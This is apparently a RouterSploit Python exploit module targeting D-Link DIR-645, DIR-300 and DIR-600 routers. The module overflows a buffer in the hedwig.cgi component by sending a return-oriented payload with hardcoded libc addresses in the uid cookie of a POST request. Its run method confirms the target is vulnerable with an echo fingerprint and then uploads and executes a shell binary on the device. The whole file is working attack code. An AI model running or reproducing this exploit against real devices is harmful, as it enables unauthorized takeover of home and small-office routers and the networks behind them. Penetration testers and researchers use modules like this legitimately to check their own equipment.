import struct
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link Hedwig CGI RCE",
        "description": "Module exploits buffer overflow vulnerablity in D-Link Hedwig CGI component, "
                       "which leads to remote code execution.",
        "authors": (
            "Austin <github.com/realoriginal>",  # routersploit module
        ),
        "references": (
            "http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10008",
            "http://www.dlink.com/us/en/home-solutions/connect/routers/dir-645-wireless-n-home-router-1000",
            "http://roberto.greyhats.it/advisories/20130801-dlink-dir645.txt",
            "https://www.exploit-db.com/exploits/27283/",
        ),
        "devices": (
            "D-Link DIR-645 Ver. 1.03",
            "D-Link DIR-300 Ver. 2.14",
            "D-Link DIR-600",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            shell(self, architecture="mipsle", method="echo", location="/tmp",
                  echo_options={"prefix": "\\\\x"}, exec_binary="chmod 777 {0} && {0} && rm {0}")
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        cmd = cmd.encode("utf-8")

        libcbase = 0x2aaf8000
        system = 0x000531FF
        calcsystem = 0x000158C8
        callsystem = 0x000159CC
        shellcode = utils.random_text(973).encode("utf-8")
        shellcode += struct.pack("<I", libcbase + system)
        shellcode += utils.random_text(16).encode("utf-8")
        shellcode += struct.pack("<I", libcbase + callsystem)
        shellcode += utils.random_text(12).encode("utf-8")
        shellcode += struct.pack("<I", libcbase + calcsystem)
        shellcode += utils.random_text(16).encode("utf-8")
        shellcode += cmd

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": b"uid=" + shellcode + b";"
        }

        data = {
            utils.random_text(7): utils.random_text(7)
        }

        response = self.http_request(
            method="POST",
            path="/hedwig.cgi",
            headers=headers,
            data=data,
        )

        if response is None:
            return ""

        return response.text[response.text.find("</hedwig>") + len("</hedwig>"):].strip()

    @mute
    def check(self):
        fingerprint = utils.random_text(10)
        cmd = "echo {}".format(fingerprint)

        response = self.execute(cmd)

        if fingerprint in response:
            return True

        return False
